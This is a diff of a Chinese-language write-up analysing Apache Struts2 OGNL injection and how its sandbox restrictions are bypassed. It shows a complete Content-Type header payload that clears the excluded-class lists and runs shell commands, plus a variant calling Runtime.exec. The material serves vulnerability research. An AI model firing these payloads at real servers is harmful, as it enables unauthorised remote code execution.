@@ -67,6 +67,16 @@ public Object get(Object key) {
 
 因此之前的S2-032的payload也因此不能用了
 
+而且阻止了所有构造函数的使用在`com.opensymphony.xwork2.ognl.SecurityMemberAccess#isClassExcluded`当中，还要求`allowStaticMethodAccess`属性为`true`才行，这样通过构造函数也无法直接执行了
+
+```java
+protected boolean isClassExcluded(Class<?> clazz) {
+  if (clazz == Object.class || clazz == Class.class && !this.allowStaticMethodAccess) {
+    return true;
+  }
+	xxxxx
+```
+
 拿到网上的payload我们进行分析
 
 ```http
@@ -159,7 +169,7 @@ public void setOgnlUtil(OgnlUtil ognlUtil) {
 Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
 ```
 
-当然也不一定非要用clear方法，毕竟这些属性都有set方法
+当然也不一定非要用clear方法，毕竟有set方法
 
 ```java
 %{(#yyds='multipart/form-data').(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses='').(#ognlUtil.excludedPackageNames='').(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('open -na Calculator'))}
